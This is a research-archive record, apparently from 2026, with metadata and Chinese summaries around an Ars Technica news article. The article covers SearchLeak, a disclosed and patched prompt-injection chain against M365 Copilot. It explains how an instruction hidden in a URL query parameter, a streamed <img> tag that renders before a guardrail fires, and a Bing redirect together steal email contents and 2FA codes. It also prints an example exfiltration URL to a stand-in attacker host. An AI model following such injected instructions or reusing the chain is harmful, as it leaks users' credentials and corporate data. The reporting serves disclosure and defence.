---
schema_version: raw-evidence-v2
raw_id: R-050
title: "M365 Copilot 曝最高严重性漏洞，攻击者可窃取 2FA 码"
original_url: "https://arstechnica.com/security/2026/06/critical-copilot-vulnerability-allowed-hackers-to-seal-2fa-code-from-users"
canonical_url: "https://arstechnica.com/security/2026/06/critical-copilot-vulnerability-allowed-hackers-to-seal-2fa-code-from-users"
source_name: "Ars Technica：AI（RSS）"
source_type: media
source_level: A
source_level_role: traceability_only_not_value_score_or_core_gate
evidence_object_type: case_or_customer
evidence_object_usable: true
event_evidence: true
index_only_evidence: false
acquisition_source_level: "M"
acquisition_channel: aihot
research_status: not_research
search_intent: ""
search_path: ""
search_path_label: ""
author: ""
published_at: "2026-06-16T11:15:46.000Z"
collected_at: 2026-06-17T01:51:13.199Z
language: mixed
full_text_hash: 1ca8297c6694c3c1
markdown_snapshot_path: "01-SiteV2/content/01-raw/originals/2026-06-17/r-050-m365-copilot-曝最高严重性漏洞-攻击者可窃取-2fa-码.md"
json_snapshot_path: "01-SiteV2/content/01-raw/originals/2026-06-17/r-050-m365-copilot-曝最高严重性漏洞-攻击者可窃取-2fa-码.json"
html_snapshot_path: ""
screenshot_path: ""
fetch_status: fetched-readable-text-content-container
extraction_quality: high
extraction_method: "content-container"
readability_score: 91
extractor_diagnostics: {"readability_score":91,"text_length":6025,"paragraph_count":28,"sentence_count":50,"boilerplate_hits":2,"symbol_ratio":0.0033,"method":"content-container"}
has_full_text: true
content_length: 6025
fetch_error: ""
raw_qc_decision: allow
raw_qc_downstream_use: eligible_after_qc
degradation_reasons: []
evidence_completeness: {"original_url_status":"present","full_text_status":"present","snapshot_status":"present","hash_status":"present","excerpt_status":"present","markdown_snapshot_status":"will_write","json_snapshot_status":"will_write","evidence_hash":"1ca8297c6694c3c1","missing":[]}
source_volatility: medium
community_name: ""
capture_scope: article_text
visible_range: "抓取时页面可见正文 / 讨论文本"
evidence_level: core_evidence_candidate
discovery_source: "AI HOT"
discovery_record: {"discovery_title":"M365 Copilot 曝最高严重性漏洞，攻击者可窃取 2FA 码","discovery_summary":"微软修复了 M365 Copilot 平台一个\"最高严重性\"漏洞。安全公司 Varonis 披露，攻击者通过参数到提示注入，向目标发送含恶意 URL 的邮件，利用 URL 中 `q` 参数嵌入指令，诱使 Copilot 搜索用户邮件并提取标题嵌入图片 URL。由于安全护栏仅在\"思考\"阶段后生效，攻击者利用流式响应先渲染 `<img>` 标签的特性提前触发 HTTP 请求，绕过输出封装限制，并通过 Bing 跳板绕过可信站点限制，窃取 2FA 码、邮件、会议邀请及 SharePoint、OneDrive 内容。该攻击名为 SearchLeak，微软已发布补丁，但底层 AI 无法区分用户指令与恶意内容的问题未解。","source_name":"Ars Technica：AI（RSS）","origin_url":"https://arstechnica.com/security/2026/06/critical-copilot-vulnerability-allowed-hackers-to-seal-2fa-code-from-users","discovered_at":"2026-06-17T01:46:29.101Z","rank_on_page":266,"discovery_status":"discovered"}
source_role: resolved_original_source
origin_fetch_status: "success"
paywall_status: none
block_status: none
duplicate_status: merged_provider_duplicates
url_hash: be1cc3a1b0e23fe0
content_hash: 1ca8297c6694c3c1
semantic_hash: fd014d5c9b7633fe
duplicate_of: "merged 1 duplicate provider hit(s) before Raw selection"
first_seen_at: "2026-06-16T11:15:46.000Z"
last_seen_at: 2026-06-17T01:51:13.199Z
update_detected: false
raw_status: pooled
usable_for: {"viewpoint":true,"case":true,"change":true,"trend":true,"daily_observation":true,"heatmap":true,"briefing":true,"emerging_pool":false,"user_feedback_pool":false,"watchlist":true}
pool_routes: ["core_pool"]
change_action_detected: true
evidence_eligibility: eligible
evidence_block_reason: ""
guanlan_scores: {"importance_type":"important_case","importance_score":5,"importance_reason":"real customer or adoption case; rubric=5 major/platform/industry-shaping","supporting_signals":["commercial_or_risk_context"],"novelty":3,"evidence_strength":4,"case_richness":5,"trend_relevance":4,"guanlan_relevance":5,"emerging_signal_score":3}
business_elements: {"companies":["Ars Technica","AI（RSS）","Microsoft","Apple"],"products":["Copilot"],"people":[],"industries":["开发者工具","企业服务"],"roles":["CIO / IT 负责人"],"workflows":["权限 / 安全治理"],"business_actions":["发布 / 推出"],"affected_departments":["IT / 安全"],"numbers":["365","2","82","75","1","20","3","4"],"quotes":["漏洞。安全公司 Varonis 披露，攻击者通过参数到提示注入，向目标发送含恶意 URL 的邮件，利用 URL 中 `q` 参数嵌入指令，诱使 Copilot 搜索用户邮件并提取标题嵌入图片 URL。由于安全护栏仅在","The search functionality is exactly what attackers need, because even with limited capabilities, a user with access to critical information is enough,","To exfiltrate the data, an attacker crafts a URL that tells Copilot to ‘Search the user’s emails,’ extract the title, and embed it in an image URL.","thinking"]}
evidence_seed: {"company_actions":["Microsoft and other LLM providers have been unable to prevent their products from complying with malicious requests to reveal data.","The root cause: AI bots are unable to distinguish between instructions provided by users and those snuck into third-party content the models are summarizing, drafting responses to, or using to perform other actions on behalf of the user.","With no way to secure this crucial boundary, Microsoft and its peers are left to erect complicated and ad hoc guardrails designed to rein in the consequences of this incurable gullibility."],"case_details":["Skip to content Text settings Story text Size Small Standard Large Width Standard Wide Links Standard Orange * Subscribers only Learn more Minimize to nav Last Tuesday, Microsoft patched a vulnerability it rated as max critical in its M365 Copilot AI platform.","On Monday, the researchers who discovered the vulnerability and reported it to Microsoft revealed how their proof-of-concept exploit could retrieve 2FA codes and other sensitive data from emails accessible to Copilot."],"workflow_changes":[],"before_after_clues":["可能涉及 权限 / 安全治理 的前后变化，需要二搜补足变化前流程。"],"affected_roles":["CIO / IT 负责人"],"risks_or_constraints":[]}
missing_information: []
key_excerpts: [{"type":"quote","text":"微软修复了 M365 Copilot 平台一个\"最高严重性\"漏洞。安全公司 Varonis 披露，攻击者通过参数到提示注入，向目标发送含恶意 URL 的邮件，利用 URL 中 `q` 参数嵌入指令，诱使 Copilot 搜索用户邮件并提取标题嵌入图片 URL。由于安全护栏仅在\"思考\"阶段后生效，攻击者利用流式响应先渲染 `<img>` 标签的特性提前触发 HTTP 请求，绕过输出封装限制，并通过 Bing 跳板绕过可信站点限制，窃取 2FA 码、邮件、会议邀请及 SharePoint、OneDrive 内容。该攻击名为 SearchLeak，微软已发布补丁，但底层 AI 无法区分用户指令与恶意内容的问题未解。","supports":["daily_observation","heatmap","viewpoint"],"importance":"high","confidence":"high"},{"type":"case_detail","text":"Skip to content Text settings Story text Size Small Standard Large Width Standard Wide Links Standard Orange * Subscribers only Learn more Minimize to nav Last Tuesday, Microsoft patched a vulnerability it rated as max critical in its M365 Copilot AI platform.","supports":["daily_observation","heatmap","case"],"importance":"high","confidence":"high"},{"type":"case_detail","text":"On Monday, the researchers who discovered the vulnerability and reported it to Microsoft revealed how their proof-of-concept exploit could retrieve 2FA codes and other sensitive data from emails accessible to Copilot.","supports":["daily_observation","heatmap","case"],"importance":"high","confidence":"high"},{"type":"company_action","text":"Microsoft and other LLM providers have been unable to prevent their products from complying with malicious requests to reveal data.","supports":["daily_observation","heatmap","change","case","trend"],"importance":"high","confidence":"high"},{"type":"company_action","text":"The root cause: AI bots are unable to distinguish between instructions provided by users and those snuck into third-party content the models are summarizing, drafting responses to, or using to perform other actions on behalf of the user.","supports":["daily_observation","heatmap","change","case","trend"],"importance":"high","confidence":"high"},{"type":"company_action","text":"With no way to secure this crucial boundary, Microsoft and its peers are left to erect complicated and ad hoc guardrails designed to rein in the consequences of this incurable gullibility.","supports":["daily_observation","heatmap","change","case","trend"],"importance":"high","confidence":"high"}]
theme: mature-commercial-signal
keyword_group: mature-commercial-signal
copyright_note: local research archive only
---

# M365 Copilot 曝最高严重性漏洞，攻击者可窃取 2FA 码

## clean_text

Skip to content
Text
settings
Story text
Size
Small
Standard
Large
Width
Standard
Wide
Links
Standard
Orange
* Subscribers only
Learn more
Minimize to nav
Last Tuesday, Microsoft patched a vulnerability it rated as max critical in its M365 Copilot AI platform. On Monday, the researchers who discovered the vulnerability and reported it to Microsoft revealed how their proof-of-concept exploit could retrieve 2FA codes and other sensitive data from emails accessible to Copilot.
Microsoft and other LLM providers have been unable to prevent their products from complying with malicious requests to reveal data. The root cause: AI bots are unable to distinguish between instructions provided by users and those snuck into third-party content the models are summarizing, drafting responses to, or using to perform other actions on behalf of the user. With no way to secure this crucial boundary, Microsoft and its peers are left to erect complicated and ad hoc guardrails designed to rein in the consequences of this incurable gullibility.
Jumping over guardrails
One guardrail built into Copilot and most other LLMs prevents them from submitting web forms, sending emails, and taking similar actions that can be used to exfiltrate data from the user. To work around this, LLM hackers turned to markup language, which, among other things, allows users to add formatting elements such as headings, lists, and links to text without the need for HTML tags. Another workaround is to wrap sensitive data inside HTML tags such as <img> and <form>. In either case, a web request showing the data hits the attacker’s web server, where the secret information is captured in logs.
One Microsoft guardrail wraps Copilot output in <code> blocks so the browser treats it as straight text. Another is to restrict the sites Copilot is permitted to visit without explicit approval. While Copilot has blanket permission to send requests to Microsoft domains, guardrails restrict requests to untrusted sites.
Security firm Varonis devised an exploit chain that was able to catapult over these guardrails. The first element was what the researchers call a Parameter-to-Prompt Injection. The parameter in this case is the q in a URL, which is used to flag a query that has been included. The Parameter-to-Prompt Injection is a close relative of the prompt injection. The difference is that the malicious command is located in the query parameter, rather than in an email or other piece of untrusted content.
To bring about the Parameter-to-Prompt Injection an attacker sends the target an email that contains the URL with the syntax https://m365.cloud.microsoft/search/?auth=2&origindomain=microsoft365&q=. The field contains an instruction. Copilot readily complied.
“The search functionality is exactly what attackers need, because even with limited capabilities, a user with access to critical information is enough,” the researchers wrote Monday . “To exfiltrate the data, an attacker crafts a URL that tells Copilot to ‘Search the user’s emails,’ extract the title, and embed it in an image URL.” The victim doesn’t type anything. They click a link, and Copilot does the rest.
Normally, the guardrail wrapping output in <code> blocks would kick in. But the researchers discovered that the protection fires only after the “thinking” phase. Prior to that, Copilot generated its response using raw HTML, which is temporarily rendered in the browser DOM.
The researchers wrote:
So, the sequence looks like this:
Copilot starts streaming its response, which includes an <img> tag
The browser sees the <img>, renders it, and fires off an HTTP request to the src URL
Copilot finishes generating. The guardrail wraps everything in <code>
Too late! The request already left.
The researchers now had an image request firing from the target’s browser. The problem, as noted earlier, is that Copilot won’t send image requests to most websites. To scale this guardrail, the exploit chain used Microsoft’s Bing search engine as a trampoline of sorts. Per the Copilot content security policy, Bing is among the sites permitted to send such requests. Bing would then send the request to the attacker-controlled domain that was included in the request. The request looked something like this:
https://www.bing.com/images/searchbyimage?cbir=sbi&imgurl=https://attacker.com/STOLEN_DATA/image.png
Varonis has named the attack SearchLeak.
“Since SearchLeak targets the Enterprise tier of Microsoft, the blast radius isn’t limited to personal data—it’s able to surface anything the user has access to inside the organization including emails, meeting invites and notes,” company researchers wrote. “SharePoint documents, OneDrive files, and other indexed business content. Depending on how M365 is connected to the environment, the blast radius could extend even wider.”
As noted, Microsoft fixed the vulnerabilities that SearchLeak exploited on Tuesday. With no known way to fix the underlying cause of such SNAFUs, however, attackers will inevitably find new ways to circumvent the newly constructed guardrails, and the process will repeat all over again.
Dan Goodin
Senior Security Editor
Dan Goodin
Senior Security Editor
Dan Goodin is Senior Security Editor at Ars Technica, where he oversees coverage of malware, computer espionage, botnets, hardware hacking, encryption, and passwords. In his spare time, he enjoys gardening, cooking, and following the independent music scene. Dan is based in San Francisco. Follow him at here on Mastodon and here on Bluesky. Contact him on Signal at DanArs.82.
75 Comments
Comments
Forum view
Loading comments...
Prev story
Next story
1.
Commodore’s newest gadget is a flip phone that blocks social media and browsers
2.
20 years of Intel Macs: Why Apple switched, and why it switched again
3.
Users cry foul after AMD stripped memory crypto from its consumer CPUs
4.
Good news—we have extra time before the Sun ends life on Earth
5.
A Chinese rocket breaks apart dangerously close to the Starlink constellation
Customize

## full_text

Skip to content
Text
settings
Story text
Size
Small
Standard
Large
Width
Standard
Wide
Links
Standard
Orange
* Subscribers only
Learn more
Minimize to nav
Last Tuesday, Microsoft patched a vulnerability it rated as max critical in its M365 Copilot AI platform. On Monday, the researchers who discovered the vulnerability and reported it to Microsoft revealed how their proof-of-concept exploit could retrieve 2FA codes and other sensitive data from emails accessible to Copilot.
Microsoft and other LLM providers have been unable to prevent their products from complying with malicious requests to reveal data. The root cause: AI bots are unable to distinguish between instructions provided by users and those snuck into third-party content the models are summarizing, drafting responses to, or using to perform other actions on behalf of the user. With no way to secure this crucial boundary, Microsoft and its peers are left to erect complicated and ad hoc guardrails designed to rein in the consequences of this incurable gullibility.
Jumping over guardrails
One guardrail built into Copilot and most other LLMs prevents them from submitting web forms, sending emails, and taking similar actions that can be used to exfiltrate data from the user. To work around this, LLM hackers turned to markup language, which, among other things, allows users to add formatting elements such as headings, lists, and links to text without the need for HTML tags. Another workaround is to wrap sensitive data inside HTML tags such as <img> and <form>. In either case, a web request showing the data hits the attacker’s web server, where the secret information is captured in logs.
One Microsoft guardrail wraps Copilot output in <code> blocks so the browser treats it as straight text. Another is to restrict the sites Copilot is permitted to visit without explicit approval. While Copilot has blanket permission to send requests to Microsoft domains, guardrails restrict requests to untrusted sites.
Security firm Varonis devised an exploit chain that was able to catapult over these guardrails. The first element was what the researchers call a Parameter-to-Prompt Injection. The parameter in this case is the q in a URL, which is used to flag a query that has been included. The Parameter-to-Prompt Injection is a close relative of the prompt injection. The difference is that the malicious command is located in the query parameter, rather than in an email or other piece of untrusted content.
To bring about the Parameter-to-Prompt Injection an attacker sends the target an email that contains the URL with the syntax https://m365.cloud.microsoft/search/?auth=2&origindomain=microsoft365&q=. The field contains an instruction. Copilot readily complied.
“The search functionality is exactly what attackers need, because even with limited capabilities, a user with access to critical information is enough,” the researchers wrote Monday . “To exfiltrate the data, an attacker crafts a URL that tells Copilot to ‘Search the user’s emails,’ extract the title, and embed it in an image URL.” The victim doesn’t type anything. They click a link, and Copilot does the rest.
Normally, the guardrail wrapping output in <code> blocks would kick in. But the researchers discovered that the protection fires only after the “thinking” phase. Prior to that, Copilot generated its response using raw HTML, which is temporarily rendered in the browser DOM.
The researchers wrote:
So, the sequence looks like this:
Copilot starts streaming its response, which includes an <img> tag
The browser sees the <img>, renders it, and fires off an HTTP request to the src URL
Copilot finishes generating. The guardrail wraps everything in <code>
Too late! The request already left.
The researchers now had an image request firing from the target’s browser. The problem, as noted earlier, is that Copilot won’t send image requests to most websites. To scale this guardrail, the exploit chain used Microsoft’s Bing search engine as a trampoline of sorts. Per the Copilot content security policy, Bing is among the sites permitted to send such requests. Bing would then send the request to the attacker-controlled domain that was included in the request. The request looked something like this:
https://www.bing.com/images/searchbyimage?cbir=sbi&imgurl=https://attacker.com/STOLEN_DATA/image.png
Varonis has named the attack SearchLeak.
“Since SearchLeak targets the Enterprise tier of Microsoft, the blast radius isn’t limited to personal data—it’s able to surface anything the user has access to inside the organization including emails, meeting invites and notes,” company researchers wrote. “SharePoint documents, OneDrive files, and other indexed business content. Depending on how M365 is connected to the environment, the blast radius could extend even wider.”
As noted, Microsoft fixed the vulnerabilities that SearchLeak exploited on Tuesday. With no known way to fix the underlying cause of such SNAFUs, however, attackers will inevitably find new ways to circumvent the newly constructed guardrails, and the process will repeat all over again.
Dan Goodin
Senior Security Editor
Dan Goodin
Senior Security Editor
Dan Goodin is Senior Security Editor at Ars Technica, where he oversees coverage of malware, computer espionage, botnets, hardware hacking, encryption, and passwords. In his spare time, he enjoys gardening, cooking, and following the independent music scene. Dan is based in San Francisco. Follow him at here on Mastodon and here on Bluesky. Contact him on Signal at DanArs.82.
75 Comments
Comments
Forum view
Loading comments...
Prev story
Next story
1.
Commodore’s newest gadget is a flip phone that blocks social media and browsers
2.
20 years of Intel Macs: Why Apple switched, and why it switched again
3.
Users cry foul after AMD stripped memory crypto from its consumer CPUs
4.
Good news—we have extra time before the Sun ends life on Earth
5.
A Chinese rocket breaks apart dangerously close to the Starlink constellation
Customize

## extraction_diagnostics

- extraction_method: content-container
- readability_score: 91
- fetch_status: fetched-readable-text-content-container
- extraction_quality: high
- diagnostics: {"readability_score":91,"text_length":6025,"paragraph_count":28,"sentence_count":50,"boilerplate_hits":2,"symbol_ratio":0.0033,"method":"content-container"}

## markdown_snapshot

本文件即为人工回查用 Markdown 快照；机器读取优先使用同目录 JSON 证据对象。

## key_excerpts

1. **quote**｜supports=daily_observation, heatmap, viewpoint｜importance=high｜confidence=high
   微软修复了 M365 Copilot 平台一个"最高严重性"漏洞。安全公司 Varonis 披露，攻击者通过参数到提示注入，向目标发送含恶意 URL 的邮件，利用 URL 中 `q` 参数嵌入指令，诱使 Copilot 搜索用户邮件并提取标题嵌入图片 URL。由于安全护栏仅在"思考"阶段后生效，攻击者利用流式响应先渲染 `<img>` 标签的特性提前触发 HTTP 请求，绕过输出封装限制，并通过 Bing 跳板绕过可信站点限制，窃取 2FA 码、邮件、会议邀请及 SharePoint、OneDrive 内容。该攻击名为 SearchLeak，微软已发布补丁，但底层 AI 无法区分用户指令与恶意内容的问题未解。

2. **case_detail**｜supports=daily_observation, heatmap, case｜importance=high｜confidence=high
   Skip to content Text settings Story text Size Small Standard Large Width Standard Wide Links Standard Orange * Subscribers only Learn more Minimize to nav Last Tuesday, Microsoft patched a vulnerability it rated as max critical in its M365 Copilot AI platform.

3. **case_detail**｜supports=daily_observation, heatmap, case｜importance=high｜confidence=high
   On Monday, the researchers who discovered the vulnerability and reported it to Microsoft revealed how their proof-of-concept exploit could retrieve 2FA codes and other sensitive data from emails accessible to Copilot.

4. **company_action**｜supports=daily_observation, heatmap, change, case, trend｜importance=high｜confidence=high
   Microsoft and other LLM providers have been unable to prevent their products from complying with malicious requests to reveal data.

5. **company_action**｜supports=daily_observation, heatmap, change, case, trend｜importance=high｜confidence=high
   The root cause: AI bots are unable to distinguish between instructions provided by users and those snuck into third-party content the models are summarizing, drafting responses to, or using to perform other actions on behalf of the user.

6. **company_action**｜supports=daily_observation, heatmap, change, case, trend｜importance=high｜confidence=high
   With no way to secure this crucial boundary, Microsoft and its peers are left to erect complicated and ad hoc guardrails designed to rein in the consequences of this incurable gullibility.

## business_elements

- companies: Ars Technica, AI（RSS）, Microsoft, Apple
- products: Copilot
- people: 暂无公开信息
- industries: 开发者工具, 企业服务
- roles: CIO / IT 负责人
- workflows: 权限 / 安全治理
- business_actions: 发布 / 推出
- affected_departments: IT / 安全
- numbers: 365, 2, 82, 75, 1, 20, 3, 4
- quotes: 漏洞。安全公司 Varonis 披露，攻击者通过参数到提示注入，向目标发送含恶意 URL 的邮件，利用 URL 中 `q` 参数嵌入指令，诱使 Copilot 搜索用户邮件并提取标题嵌入图片 URL。由于安全护栏仅在 / The search functionality is exactly what attackers need, because even with limited capabilities, a user with access to critical information is enough, / To exfiltrate the data, an attacker crafts a URL that tells Copilot to ‘Search the user’s emails,’ extract the title, and embed it in an image URL. / thinking

## evidence_seed

- company_actions: Microsoft and other LLM providers have been unable to prevent their products from complying with malicious requests to reveal data. / The root cause: AI bots are unable to distinguish between instructions provided by users and those snuck into third-party content the models are summarizing, drafting responses to, or using to perform other actions on behalf of the user. / With no way to secure this crucial boundary, Microsoft and its peers are left to erect complicated and ad hoc guardrails designed to rein in the consequences of this incurable gullibility.
- case_details: Skip to content Text settings Story text Size Small Standard Large Width Standard Wide Links Standard Orange * Subscribers only Learn more Minimize to nav Last Tuesday, Microsoft patched a vulnerability it rated as max critical in its M365 Copilot AI platform. / On Monday, the researchers who discovered the vulnerability and reported it to Microsoft revealed how their proof-of-concept exploit could retrieve 2FA codes and other sensitive data from emails accessible to Copilot.
- workflow_changes: 暂无公开信息
- before_after_clues: 可能涉及 权限 / 安全治理 的前后变化，需要二搜补足变化前流程。
- affected_roles: CIO / IT 负责人
- risks_or_constraints: 暂无公开信息

## guanlan_scores

- importance_type: important_case
- importance_score: 5
- importance_reason: real customer or adoption case; rubric=5 major/platform/industry-shaping
- supporting_signals: commercial_or_risk_context
- novelty: 3
- evidence_strength: 4
- case_richness: 5
- trend_relevance: 4
- guanlan_relevance: 5
- emerging_signal_score: 3

## usable_for

- viewpoint: true
- case: true
- change: true
- trend: true
- daily_observation: true
- heatmap: true
- briefing: true
- emerging_pool: false
- user_feedback_pool: false
- watchlist: true

## pool_routes

- core_pool

## missing_information

- none

## volatile_and_discovery_handling

- source_volatility: medium
- community_name: not_applicable
- capture_scope: article_text
- visible_range: 抓取时页面可见正文 / 讨论文本
- evidence_level: core_evidence_candidate
- discovery_source: AI HOT
- source_role: resolved_original_source
- origin_fetch_status: success
- discovery_record: {"discovery_title":"M365 Copilot 曝最高严重性漏洞，攻击者可窃取 2FA 码","discovery_summary":"微软修复了 M365 Copilot 平台一个\"最高严重性\"漏洞。安全公司 Varonis 披露，攻击者通过参数到提示注入，向目标发送含恶意 URL 的邮件，利用 URL 中 `q` 参数嵌入指令，诱使 Copilot 搜索用户邮件并提取标题嵌入图片 URL。由于安全护栏仅在\"思考\"阶段后生效，攻击者利用流式响应先渲染 `<img>` 标签的特性提前触发 HTTP 请求，绕过输出封装限制，并通过 Bing 跳板绕过可信站点限制，窃取 2FA 码、邮件、会议邀请及 SharePoint、OneDrive 内容。该攻击名为 SearchLeak，微软已发布补丁，但底层 AI 无法区分用户指令与恶意内容的问题未解。","source_name":"Ars Technica：AI（RSS）","origin_url":"https://arstechnica.com/security/2026/06/critical-copilot-vulnerability-allowed-hackers-to-seal-2fa-code-from-users","discovered_at":"2026-06-17T01:46:29.101Z","rank_on_page":266,"discovery_status":"discovered"}

## 原始摘要 / 采集文本

微软修复了 M365 Copilot 平台一个"最高严重性"漏洞。安全公司 Varonis 披露，攻击者通过参数到提示注入，向目标发送含恶意 URL 的邮件，利用 URL 中 `q` 参数嵌入指令，诱使 Copilot 搜索用户邮件并提取标题嵌入图片 URL。由于安全护栏仅在"思考"阶段后生效，攻击者利用流式响应先渲染 `<img>` 标签的特性提前触发 HTTP 请求，绕过输出封装限制，并通过 Bing 跳板绕过可信站点限制，窃取 2FA 码、邮件、会议邀请及 SharePoint、OneDrive 内容。该攻击名为 SearchLeak，微软已发布补丁，但底层 AI 无法区分用户指令与恶意内容的问题未解。

## 采集备注

该条目由 aihot 发现，source_level 只作追溯记录，不判断商业价值，也不决定 core_pool。AI HOT daily 和 paused-opinion-source 的权重来自精选入口，不来自来源等级。HN / Reddit / X 等社区材料可用于讨论升温、用户反馈和早期观察，但不能单独证明公司动作、客户采用、收入、融资或市场规模。
